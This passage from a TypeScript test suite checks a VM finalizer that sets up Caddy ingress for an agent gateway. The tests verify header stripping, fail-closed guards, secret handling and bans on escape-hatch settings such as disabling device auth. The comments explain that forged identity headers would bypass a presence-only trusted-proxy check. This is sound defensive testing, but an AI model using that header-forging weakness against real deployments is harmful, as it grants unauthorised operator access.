    // The abort diagnostic too: an operator reading a stale port from a failed
    // boot is chasing the wrong socket.
    expect(agentFinalizer).toContain(`did not answer on 127.0.0.1:${AGENT_GATEWAY_PORT}`);
  });

  test('the token temporary is cleaned up on an abort, like the Caddyfile temporary', () => {
    expect(agentFinalizer).toContain(`trap 'rm -f /etc/openclaw/agent.env.tmp' EXIT`);
  });

  test('the route keeps the /agent prefix — the gateway matches the full pathname', () => {
    expect(agentFinalizer).toContain('@agentBrowser path /agent /agent/*');
    expect(agentFinalizer).toContain('handle @agentBrowser');
    // `handle_path` strips the matched prefix, which would deliver `/` to a
    // gateway that matches the FULL pathname against its configured basePath.
    expect(agentCode).not.toContain('handle_path');
  });

  // -------------------------------------------------------------------------
  // #68: split browser and native ingress.
  //
  // These two handler blocks ARE the authentication boundary. The pinned
  // Gateway's `gateway.auth.trustedProxy.requiredHeaders` is a PRESENCE check —
  // it never compares the header value — so with `allowLoopback: true` anything
  // that reaches 127.0.0.1:3334 with two headers set gets trusted-operator
  // scope. What actually binds identity is that Caddy deletes any client-supplied
  // copy of those headers before forwarding and re-creates exactly one from
  // GBrain's own answer.
  //
  // Contains-assertions alone are not enough here: `header_up -Cookie` appearing
  // once satisfies a whole-file `toContain` even if one of the two upstreams
  // forgot it. Everything below is therefore bound to a specific handler block.
  // -------------------------------------------------------------------------

  /** The body of a brace-delimited block introduced by `opener`, braces balanced. */
  function block(source: string, opener: string): string {
    const start = source.indexOf(opener);
    expect(start, `no \`${opener}\` block`).toBeGreaterThan(-1);
    let depth = 0;
    for (let i = start + opener.length - 1; i < source.length; i += 1) {
      if (source[i] === '{') depth += 1;
      else if (source[i] === '}') {
        depth -= 1;
        if (depth === 0) return source.slice(start + opener.length, i);
      }
    }
    throw new Error(`the \`${opener}\` block is never closed`);
  }

  /** The rendered agent Caddyfile, comments already stripped. */
  function agentCaddyfile(): string {
    return caddyfileHeredoc(agentCode, '"\\$caddyfile_tmp"');
  }

  /**
   * The body of a handler block, and PROOF that reading its written order means
   * anything at all.
   *
   * Caddy re-sorts directives inside a `handle` block into its own standard
   * order at adapt time. Written order is not effective order. This suite
   * previously asserted that `request_header -X-GBrain-OpenClaw-User` appeared
   * above `forward_auth` in the file; that assertion passed while the adapted
   * config ran the strips AFTER the auth call, which broke the authentication
   * boundary in both directions at once — a forged identity reached the gate,
   * and the strips then deleted the header `copy_headers` had just written, so
   * the real identity never reached OpenClaw. A written-order assertion over a
   * reordered construct is the presence-check-mistaken-for-a-fail-closed-check
   * class, one level up.
   *
   * `route { }` is the one construct whose written order survives adaptation
   * verbatim. This helper refuses to hand back a block that is not wrapped in
   * one, so every ordering assertion below is anchored to a construct that
   * actually preserves it. The authoritative proof — reading Caddy's own adapted
   * handler sequence — lives in workspace-transport-caddy.test.ts, which
   * requires the binary; this is the dependency-free guard that the construct
   * enabling it is still in place.
   */
  function orderedBlock(source: string, opener: string): string {
    const body = block(source, opener);
    const inner = body.trim();
    expect(
      inner.startsWith('route {') && inner.endsWith('}'),
      `\`${opener}\` must wrap its directives in \`route { }\`: a bare \`handle\` block is `
      + 'reordered by Caddy at adapt time, so the strip that authenticates this route would '
      + 'run after the forward_auth it is supposed to protect.',
    ).toBe(true);
    return block(body, 'route {');
  }

  test('the browser route authenticates through GBrain and forges nothing', () => {
    const caddy = agentCaddyfile();
    expect(caddy).toContain('path /agent /agent/*');
    expect(caddy).toContain('uri /api/workspace/v1/agent/authorize');
    expect(caddy).toContain('copy_headers X-GBrain-OpenClaw-User');

    const browser = orderedBlock(caddy, 'handle @agentBrowser {');
    // THE boundary. A client-supplied identity header must be deleted from the
    // request before anything downstream — the forward_auth call included — can
    // see it, or any Member could name themselves anyone.
    expect(browser).toContain('request_header -X-GBrain-OpenClaw-User');
    expect(browser).toContain('request_header -X-GBrain-OpenClaw-Proxy');
    // Ordering is load-bearing, and `orderedBlock` above is what makes reading
    // it here meaningful — see its comment. The strips must precede the
    // forward_auth and the proxy, not merely appear somewhere in the block.
    const strip = browser.indexOf('request_header -X-GBrain-OpenClaw-User');
    const proxyStrip = browser.indexOf('request_header -X-GBrain-OpenClaw-Proxy');
    const auth = browser.indexOf('forward_auth');
    const proxy = browser.indexOf('reverse_proxy');
    expect(strip).toBeGreaterThan(-1);
    expect(auth).toBeGreaterThan(strip);
    expect(auth).toBeGreaterThan(proxyStrip);
    expect(proxy).toBeGreaterThan(auth);

    const forwardAuth = block(browser, `forward_auth 127.0.0.1:${GBRAIN_WEB_PORT} {`);
    expect(forwardAuth).toContain('uri /api/workspace/v1/agent/authorize');
    expect(forwardAuth).toContain('copy_headers X-GBrain-OpenClaw-User');
    // The GBrain session cookie is what authorize authenticates with, so it must
    // NOT be stripped for the auth call — only for the OpenClaw upstream.
    expect(forwardAuth).not.toContain('-Cookie');

    const upstream = block(browser, `reverse_proxy 127.0.0.1:${AGENT_GATEWAY_PORT} {`);
    expect(upstream).toContain('header_up X-GBrain-OpenClaw-Proxy "gbrain-browser-v1"');
    for (const header of [
      'Cookie', 'X-OpenClaw-Scopes', 'Forwarded',
      'X-Forwarded-For', 'X-Forwarded-Host', 'X-Forwarded-Proto', 'X-Real-IP',
    ]) {
      expect(upstream, `the browser upstream must strip ${header}`).toContain(`header_up -${header}`);
    }
  });

  test('the native route gates on readiness and carries no proxy identity', () => {
    const caddy = agentCaddyfile();
    expect(caddy).toContain('path /agent-client /agent-client/*');
    expect(caddy).toContain('uri /api/workspace/v1/agent/native-ready');
    expect(caddy).toContain('uri replace /agent-client /agent');

    const native = orderedBlock(caddy, 'handle @agentNative {');
    const forwardAuth = block(native, `forward_auth 127.0.0.1:${GBRAIN_WEB_PORT} {`);
    expect(forwardAuth).toContain('uri /api/workspace/v1/agent/native-ready');
    // The readiness gate must never receive the shared bearer password; the
    // original request still carries it to OpenClaw.
    expect(forwardAuth).toContain('header_up -Authorization');

    // The rewrite happens after the gate and before the upstream.
    const auth = native.indexOf('forward_auth');
    const rewrite = native.indexOf('uri replace /agent-client /agent');
    const proxy = native.indexOf('reverse_proxy');
    expect(rewrite).toBeGreaterThan(auth);
    expect(proxy).toBeGreaterThan(rewrite);

    const upstream = block(native, `reverse_proxy 127.0.0.1:${AGENT_GATEWAY_PORT} {`);
    // Deliberately NO proxy identity here: the pinned Gateway's direct-loopback
    // password fallback is what authenticates the app or CLI. A trusted-proxy
    // header on this route would authenticate every native caller regardless of
    // the password.
    expect(upstream).not.toContain('header_up X-GBrain-OpenClaw-Proxy "');
    expect(upstream).not.toContain('header_up X-GBrain-OpenClaw-User ');
    for (const header of [
      'Cookie', 'X-GBrain-OpenClaw-User', 'X-GBrain-OpenClaw-Proxy', 'X-OpenClaw-Scopes',
      'Forwarded', 'X-Forwarded-For', 'X-Forwarded-Host', 'X-Forwarded-Proto', 'X-Real-IP',
    ]) {
      expect(upstream, `the native upstream must strip ${header}`).toContain(`header_up -${header}`);
    }
    // The Authorization strip belongs to the gate ONLY. Stripping it from the
    // upstream too would leave the native client with no credential at all.
    expect(upstream).not.toContain('header_up -Authorization');
  });

  test('both OpenClaw upstreams refuse a caller-chosen scope set', () => {
    const caddy = agentCaddyfile();
    for (const handler of ['handle @agentBrowser {', 'handle @agentNative {']) {
      const upstream = block(orderedBlock(caddy, handler), `reverse_proxy 127.0.0.1:${AGENT_GATEWAY_PORT} {`);
      expect(upstream, `${handler} upstream must strip X-OpenClaw-Scopes`).toContain('header_up -X-OpenClaw-Scopes');
    }
  });

  test('the browser and native handlers precede the root GBrain handler', () => {
    const caddy = agentCaddyfile();
    const browser = caddy.indexOf('handle @agentBrowser');
    const native = caddy.indexOf('handle @agentNative');
    // The bare `handle {` fallback is the GBrain root route; a matcher-less
    // handle placed first would swallow both agent paths.
    const root = caddy.indexOf('handle {');
    expect(browser).toBeGreaterThan(-1);
    expect(native).toBeGreaterThan(browser);
    expect(root).toBeGreaterThan(native);
  });

  test('device authentication is never disabled to make the split routes work', () => {
    // Stripping every forwarded-evidence header makes the pinned Gateway see the
    // Caddy hop as loopback, which is enough for it to pair a fresh Control UI or
    // native device. Password/trusted-proxy identity alone does not grant every
    // WebSocket scope — the paired device identity does — so the temptation to
    // "fix" a scope problem by disabling device auth is real and must fail here.
    expect(agentCode).not.toContain('dangerouslyDisableDeviceAuth true');
    expect(agentCode).not.toMatch(/dangerouslyDisableDeviceAuth\s+true/);
  });

  test('the deployment secret the native password derives from must exist and is never copied', () => {
    // A missing GBRAIN_WORKSPACE_TOKEN_SECRET means every derived native password
    // changes the moment one appears, and the binding's pinned fingerprint then
    // fails closed forever. An agent VM must refuse to finalize without it rather
    // than come up with ingress that can never open.
    // The check is a COUNT of assignments carrying real material, so a
    // present-but-blank AND a present-but-whitespace key both fail. `.+` would
    // have matched `GBRAIN_WORKSPACE_TOKEN_SECRET=   ` — a value that derives a
    // password exactly as unusable as an absent one — which is what made the
    // earlier form one more presence check. `[^[:space:]]` is the teeth.
    expect(agentCode).toMatch(
      /grep -c -E '\^GBRAIN_WORKSPACE_TOKEN_SECRET=\[\^\[:space:\]\]'[^\n]*"\$ENV_FILE"/,
    );
    // Named explicitly so a "simplification" back to `.+` fails here.
    expect(agentCode).not.toContain("'^GBRAIN_WORKSPACE_TOKEN_SECRET=.+$'");
    expect(agentCode).toContain('agent finalize requires GBRAIN_WORKSPACE_TOKEN_SECRET');
    // The check must precede every write, or a VM can be left half-configured by
    // a precondition that was never a precondition.
    const check = agentCode.indexOf('GBRAIN_WORKSPACE_TOKEN_SECRET');
    expect(check).toBeGreaterThan(-1);
    expect(agentCode.indexOf('/etc/openclaw/agent.env.tmp')).toBeGreaterThan(check);
    expect(agentCode.indexOf('openclaw_config_set gateway.mode')).toBeGreaterThan(check);
    // The value is never captured into a shell variable: this script's
    // environment is inherited by everything it invokes, `sudo -u openclaw`
    // included, and root extracts only the subdomain from the env file.
    expect(agentCode).not.toMatch(/^[A-Za-z_]*TOKEN_SECRET[A-Za-z_]*=/m);
    expect(agentCode).not.toMatch(/=.*\$\(.*GBRAIN_WORKSPACE_TOKEN_SECRET.*\)/);
    // …and it stays in root's own memory. The agent-scoped environment file is a
    // marker, readable by the openclaw identity: one boolean, no credential.
    const marker = /printf '([^']*)' >\/etc\/openclaw\/agent\.env\.tmp/.exec(agentCode);
    expect(marker, 'the agent env marker is no longer written with printf').not.toBeNull();
    expect(marker![1]).toBe('GBRAIN_AGENT_RUNTIME_ENABLED=true\\n');
    expect(marker![1]).not.toContain('TOKEN_SECRET');
    // Nothing anywhere in the script may put the secret on a path OpenClaw reads.
    expect(agentCode).not.toMatch(/GBRAIN_WORKSPACE_TOKEN_SECRET[^\n]*\/etc\/openclaw/);
    expect(agentCode).not.toMatch(/openclaw_config_set[^\n]*TOKEN_SECRET/);
  });

  /**
   * A guard that aborts: `if <condition>; then` … `echo … >&2` … `exit 2` … `fi`.
   *
   * The gap between the parts is bounded to at most two lines AND forbidden from
   * containing another guard's `; then` or a `fi`. An unbounded `[\s\S]*?` gap
   * looks non-greedy but lets the match BRIDGE into the next guard block and
   * borrow its `exit 2`/`fi`, so deleting a block's own abort left the assertion
   * green — the same fail-open class this suite exists to catch. Each guard is
   * proven by its own mutation, not by reading the regex.
   */
  const failsClosed = (condition: string): RegExp => {
    const gap = String.raw`(?:(?![ \t]*fi[ \t]*$)(?![^\n]*; then)[^\n]*\n){0,2}`;
    return new RegExp(
      String.raw`if ${condition}; then\n${gap}[ \t]*echo "[^"]*" >&2\n${gap}[ \t]*exit 2\n[ \t]*fi\n`,
    );
  };

  test('the service is enabled and the finalizer fails closed when the gateway never answers', () => {
    expect(agentFinalizer).toContain('systemctl enable --now gbrain-agent.service');
    expect(agentFinalizer).toMatch(/set -euo pipefail/);
    expect(agentFinalizer).toContain('http://127.0.0.1:3334/agent');
    // A bare /exit 2/ is satisfied by ANY of the script's abort paths, so
    // deleting exactly one branch would leave it green. Every fail-closed path
    // is pinned to its own condition instead.
    for (const condition of [
      String.raw`\[\[ "\$\(id -u\)" -ne 0 \]\]`,
      String.raw`\[\[ -z "\$GBRAIN_SUBDOMAIN" \]\]`,
      String.raw`\[\[ ! "\$GBRAIN_SUBDOMAIN" =~ [^\n]+ \]\]`,
      String.raw`\[\[ ! "\$gateway_status" =~ \^\[1-5\]\[0-9\]\[0-9\]\$ \]\]`,
      String.raw`! systemctl is-active --quiet gbrain-agent\.service`,
    ]) {
      expect(agentFinalizer, `no aborting guard for ${condition}`).toMatch(failsClosed(condition));
    }
    expect(agentFinalizer).toContain('systemctl is-active --quiet gbrain-agent.service');
    expect(agentFinalizer).toContain('systemctl reload caddy.service');
  });

  test('the gateway wait asserts a real HTTP status rather than the absence of one', () => {
    // `curl … || true` leaves gateway_status EMPTY when curl cannot run at all,
    // and empty is not "000" — so a negative check (`== "000"` → abort) declares
    // success on a gateway it never reached. Only a positive assertion closes it.
    expect(agentCode).toMatch(/^\s*if \[\[ "\$gateway_status" =~ \^\[1-5\]\[0-9\]\[0-9\]\$ \]\]; then$/m);
    expect(agentCode).not.toContain('"000"');
    // One request per iteration: the loop already leaves gateway_status set, so a
    // second post-loop curl is a duplicate with its own race window. Scoped to
    // the readiness probe's own URL, because #68 added three further curls that
    // run once each after the gateway is already known to answer.
    expect(agentCode.match(/curl[^\n]*\|\| true\)"\n/g)?.length).toBeGreaterThan(0);
    expect(
      agentCode.match(new RegExp(String.raw`curl -s -o /dev/null -w '%\{http_code\}' http://127\.0\.0\.1:3334${AGENT_BASE_PATH}`, 'g'))?.length,
    ).toBe(1);
  });

  test('both likely real-VM failures emit actionable unit diagnostics', () => {
    // The gateway wait and the is-active check are where this breaks first, and
    // `is-active --quiet` alone fails with a bare exit 3 and no message.
    expect(agentFinalizer).toContain('systemctl status gbrain-agent.service --no-pager >&2');
    expect(agentFinalizer).toContain('journalctl -u gbrain-agent.service -n 50 --no-pager >&2');
    // Every abort path that can be caused by the runtime must actually call
    // them, not merely define them. Derived from the guards themselves rather
    // than a hard-coded count, so a new runtime guard added without diagnostics
    // fails here instead of quietly shipping a bare `exit 2`.
    const runtimeGuards = agentCode
      .split('\n')
      .filter(line => /^ {2}echo "(?:the|gbrain-agent\.service|2Brain agent)/.test(line));
    expect(runtimeGuards.length).toBeGreaterThanOrEqual(2);
    const diagnosticCalls = agentFinalizer.match(/^ {2}agent_diagnostics$/gm)?.length ?? 0;
    expect(diagnosticCalls).toBeGreaterThanOrEqual(2);
    // The two the comment above names, pinned to their own conditions.
    expect(agentCode).toMatch(
      /if \[\[ ! "\$gateway_status" =~[^\n]*\n[ \t]*echo[^\n]*\n[ \t]*agent_diagnostics\n/,
    );
    expect(agentCode).toMatch(
      /if ! systemctl is-active --quiet gbrain-agent\.service; then\n[ \t]*echo[^\n]*\n[ \t]*agent_diagnostics\n/,
    );
  });

  test('the rendered Caddyfile is validated before it replaces the live one', () => {
    // Installing first destroys the known-good config on a bad render, and any
    // later `systemctl restart caddy` on that VM then fails. Ordering, not
    // presence: two independent toContain assertions cannot see a swap.
    const validate = agentCode.indexOf('caddy validate --config "$caddyfile_tmp" --adapter caddyfile');
    const install = agentCode.indexOf('install -m 0644 -o root -g root "$caddyfile_tmp" /etc/caddy/Caddyfile');
    expect(validate, 'the rendered Caddyfile must be validated as a temporary file').toBeGreaterThan(-1);
    expect(install).toBeGreaterThan(-1);
    expect(validate).toBeLessThan(install);
  });

  test('the gateway keeps its strict-origin and device-auth checks — no escape hatch', () => {
    // OpenClaw ships three documented bypasses. The exact origin allow-list and
    // trusted-proxy list above are what make the proxied WebSocket work; any of
    // these would make it work by DISABLING the check instead, and nothing else
    // in this suite would notice.
    // Structural, not `not.toContain`: #68's effective-config probe NAMES each
    // hatch in order to assert its absence at runtime, so a blanket text ban
    // would forbid the strongest check in the file. What must never happen is
    // an ASSIGNMENT, which the parsed config map can see directly.
    const configuredKeys = parseOpenclawConfigSets(agentFinalizer).map(([key]) => key);
    for (const escapeHatch of [
      'dangerouslyAllowHostHeaderOriginFallback',
      'dangerouslyDisableDeviceAuth',
      'allowInsecureAuth',
    ]) {
      expect(
        configuredKeys.some(key => key.includes(escapeHatch)),
        `gbrain-agent-finalize must never set the ${escapeHatch} escape hatch`,
      ).toBe(false);
      // And each must be proven ABSENT from the effective config on the VM,
      // which is what catches a hatch left behind by an earlier image.
      expect(
        agentCode,
        `gbrain-agent-finalize must prove ${escapeHatch} is absent at runtime`,
      ).toContain(`'gateway.controlUi.${escapeHatch}',`);
    }
    // `dangerously`-prefixed keys are the upstream naming convention for the
    // whole class, so a fourth one assigned later fails here without a test edit.
    expect(configuredKeys.filter(key => /dangerously/i.test(key))).toEqual([]);
  });

  test('the Brain-tier Caddy root route survives the agent rewrite unchanged', () => {
    // The agent finalizer replaces the WHOLE Caddyfile, so this compares the two
    // heredocs against each other rather than hard-coding today's three
    // directives: if the Brain-tier heredoc later gains a directive or changes
    // its upstream port, hard-coded literals would keep passing while the agent
    // rewrite silently dropped it. The Brain-tier finalizer stays untouched —
    // enforcement lives entirely here.
    const brainBody = caddyfileHeredoc(brainFinalizer, '/etc/caddy/Caddyfile');
    const agentBody = caddyfileHeredoc(agentCode, '"\\$caddyfile_tmp"');
    const agentLines = new Set(agentBody.split('\n').map(line => line.trim()));
    const siteBlock = new Set(['${GBRAIN_SUBDOMAIN} {', '}', '']);
    const brainDirectives = brainBody
      .split('\n')
      .map(line => line.trim())
      .filter(line => !siteBlock.has(line));
    // Guards the comparison itself: an empty directive list would assert nothing.
    expect(brainDirectives.length).toBeGreaterThanOrEqual(3);
    for (const directive of brainDirectives) {
      expect(
        agentLines.has(directive),
        `the agent Caddyfile rewrite drops the Brain-tier directive \`${directive}\``,
      ).toBe(true);
    }
  });

  /**
   * cloud-init's `runcmd` runs every entry regardless of the previous entry's
   * exit status, so "chained after the Brain finalizer" never meant "gated on
   * it". On the first real agent VM the Brain finalizer exited 2 and this
   * script still ran: it minted the access token, wrote the gateway config,
   * enabled the unit, and replaced the Caddyfile on a VM where none of the
   * Brain-tier invariants — the #56 inert-agent proofs included — had held.
   *
   * The marker is the Brain finalizer's own last act, so it is the one signal
   * that cannot be true early. Executed, not read: a guard that parses well and
   * exits at the wrong moment is exactly the failure this pins.
   */
  test('the agent refuses to start when Brain-tier finalization did not complete', async () => {
    const root = await mkdtemp(join(tmpdir(), 'gbrain-agent-gate-'));
    try {
      const scriptPath = join(root, 'gbrain-agent-finalize');
      await writeFile(scriptPath, agentFinalizer);
      await chmod(scriptPath, 0o755);
      // A marker root that exists but holds no completion file: the guard must
      // fail on the FILE, not incidentally on a missing directory.
      const markerRoot = join(root, 'var-lib-gbrain');
      await mkdir(markerRoot, { recursive: true });
      // The environment file is present and valid, so the only thing wrong on
      // this run is the absent marker. Without this the script would exit 2 on
      // a missing GBRAIN_SUBDOMAIN even with the guard deleted, and the test
      // would pass over a fail-open script.
      const envPath = join(root, 'workspace.env');
      await writeFile(envPath, 'GBRAIN_SUBDOMAIN=acme-example.workspaces.example.com\n');
      await chmod(envPath, 0o600);
      const sentinel = join(root, 'openclaw-was-called');
      const command = `set +e
export GBRAIN_ENV_FILE='${bashPath(envPath)}'
export GBRAIN_BRAIN_COMPLETE_MARKER='${bashPath(markerRoot)}/cloud-init-complete'
fake_dir=$(mktemp -d)
for tool in systemctl openclaw caddy openssl install; do
  printf '#!/bin/sh\\ntouch "%s"\\n' '${bashPath(sentinel)}' >"$fake_dir/$tool"
  chmod +x "$fake_dir/$tool"
done
export PATH="$fake_dir:$PATH"
'${bashPath(scriptPath)}'
status=$?
rm -rf "$fake_dir"
printf 'status=%s sentinel=%s\\n' "$status" "$(test -e '${bashPath(sentinel)}' && echo yes || echo no)"`;
      const shell =
        process.platform === 'win32'
          ? ['wsl.exe', '-u', 'root', '-e', 'bash', '-c', command]
          : ['bash', '-c', command];
      const child = Bun.spawn(shell, { stdout: 'pipe', stderr: 'pipe' });
      const [stdout, stderr] = await Promise.all([
        new Response(child.stdout).text(),
        new Response(child.stderr).text(),
      ]);
      await child.exited;

      expect(stderr).toContain('2Brain workspace finalization did not complete');
      expect(stdout.trim()).toBe('status=2 sentinel=no');
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  }, 20_000);

  test('the token file is written privately without leaking a global umask', () => {
    // A bare `umask 077` persists for the rest of the script under `set -e` and
    // would make the Caddyfile unreadable to the unprivileged caddy identity.
    expect(agentFinalizer).not.toMatch(/^umask /m);
    expect(agentFinalizer).toContain('install -m 0644 -o root -g root');
  });

  test('the gateway is restarted after plugin config, or the routes never register', () => {
    // Plugin HTTP routes register during plugin startup only. A gateway already
    // running from an earlier partial run would keep serving the plugin-less
    // route table with every assignment already on disk, and `enable --now`
    // does nothing to a running unit. Ordering, not presence.
    const enable = agentCode.indexOf('systemctl enable --now gbrain-agent.service');
    const restart = agentCode.indexOf('systemctl restart gbrain-agent.service');
    const routeProbe = agentCode.indexOf('http://127.0.0.1:3334/api/v1/gbrain/provider');
    const lastConfigSet = agentCode.lastIndexOf('openclaw_config_set ');
    expect(enable).toBeGreaterThan(-1);
    expect(restart).toBeGreaterThan(-1);
    expect(lastConfigSet).toBeLessThan(restart);
    expect(enable).toBeLessThan(restart);
    expect(restart).toBeLessThan(routeProbe);
  });

  // -------------------------------------------------------------------------
  // #68 Task 12 — approvals, model switching, and Channels are OpenClaw's.
  //
  // The image is where a "convenient" reversal would be cheapest: one extra
  // `openclaw_config_set` auto-approving execs, or a web terminal re-enabled to
  // debug a live VM, and the pilot's fail-closed execution story is gone with
  // nothing in the product visibly changed.
  //
  // What the runtime actually guarantees, and therefore what the image must not
  // undermine: an approval that times out DENIES, default
  // `DEFAULT_EXEC_APPROVAL_TIMEOUT_MS = 1800000`
  // [VERIFIED: package/dist/server-aux-handlers-BfM3vWwc.js:1166-1179,
  // package/dist/exec-approvals-BIKWP8_V.js:187]; the first accepted response
  // wins and later responders are told "approval already resolved"
  // [VERIFIED: package/dist/server-aux-handlers-BfM3vWwc.js:1152-1165,
  // package/dist/approval-shared-BKEyXMsJ.js:282]; and the shared identity holds
  // `operator.approvals` by default, so it can answer them itself
  // [VERIFIED: package/docs/gateway/operator-scopes.md:112-115].
  // -------------------------------------------------------------------------

  test('the pinned gateway config disables the terminal and configures no approval, channel, or device-auth override', () => {
    const configured = Object.keys(AGENT_GATEWAY_CONFIG);

    // The web terminal is a "no administration escape hatch" invariant, and it
    // is asserted as an explicit `false` rather than as an absence: an absent
    // key is whatever the pinned release defaults to, which is not a decision
    // this repository made.
    expect(AGENT_GATEWAY_CONFIG['gateway.terminal.enabled']).toBe('false');
    expect(configured.filter(key => key.startsWith('gateway.terminal.'))).toEqual(['gateway.terminal.enabled']);

    // Nothing here may pre-decide an approval, pre-configure a channel, relax
    // pairing, or pin a session model. Each is a family, not a literal, so a
    // key nobody predicted still fails.
    for (const forbidden of [
      /approval/i,
      /channel/i,
      /autoApprove/i,
      /deviceAuth/i,
      /modelOverride/i,
      /\.pairing\./i,
    ]) {
      expect(
        configured.filter(key => forbidden.test(key)),
        `the image must not configure ${forbidden}: that decision belongs to OpenClaw at runtime`,
      ).toEqual([]);
    }

    // The default model CHAIN is legitimately ours — it is the Codex → Claude
    // fallback the product promises — while a session override is not. Pinned
    // here so the distinction survives a future "tidy up the model config".
    expect(AGENT_GATEWAY_CONFIG['agents.defaults.model.primary']).toBe('openai/gpt-5.6-sol');
    expect(AGENT_GATEWAY_CONFIG['agents.defaults.model.fallbacks']).toContain('anthropic/claude-sonnet-5');
    // Automatic fallback applies only while there is NO session model override
    // [VERIFIED: package/dist/agent-scope-B2Pk_xhT.js:281]; an explicit override
    // returns no fallback candidates and stays strict until `/model default`
    // [VERIFIED: package/dist/agent-scope-B2Pk_xhT.js:282,
    // package/dist/directive-handling.model-selection-XLicBEnj.js:55]. So the
    // image must never ship a session-level pin: it would silently disable the
    // fallback the product page promises.
    expect(configured.filter(key => /session/i.test(key))).toEqual([]);
  });

  test('the finalizer never writes an approval, channel, or terminal enablement anywhere', () => {
    // Broader than the parsed config map on purpose: the map cannot see a raw
    // `openclaw config set` inside a function body, and a channel credential
    // could be installed by any other means the script has.
    expect(agentCode).not.toMatch(/openclaw[^\n]*\b(approvals?|channels?)\b/i);
    expect(agentCode).not.toMatch(/gateway\.terminal\.enabled\s+true/);
    // GBrain adds no channel sender allowlist — that is an accepted #45
    // trade-off, stated in the product copy, not a gap to be quietly closed on
    // the VM with a half-implementation.
    expect(agentCode).not.toMatch(/allowedSenders|senderAllowlist|channel_allowlist/i);
  });

  test('exactly two ingress prefixes reach the OpenClaw gateway, and nothing else does', () => {
    const caddy = agentCaddyfile();
    const upstream = `127.0.0.1:${AGENT_GATEWAY_PORT}`;
    const count = (source: string) => source.split(upstream).length - 1;

    const total = count(caddy);
    const browser = count(orderedBlock(caddy, 'handle @agentBrowser {'));
    const native = count(orderedBlock(caddy, 'handle @agentNative {'));

    // Anti-vacuous, then exact: one upstream per route and no third one
    // anywhere in the file — a `handle @agentTerminal` or a debug passthrough
    // added later fails on the total even if it is otherwise well formed.
    expect(total).toBeGreaterThan(0);
    expect(browser).toBe(1);
    expect(native).toBe(1);
    expect(total).toBe(browser + native);

    // …and those two routes are matched by exactly the two documented public
    // prefixes. `/agent/` is the only browser Control UI route; `/agent-client/`
    // is the only native one.
    const matchers = [...caddy.matchAll(/^\s*@(\w+)\s+path\s+(.+)$/gm)].map(match => `@${match[1]} path ${match[2].trim()}`);
    expect(matchers.sort()).toEqual([
      '@agentBrowser path /agent /agent/*',
      '@agentNative path /agent-client /agent-client/*',
    ]);
  });
});
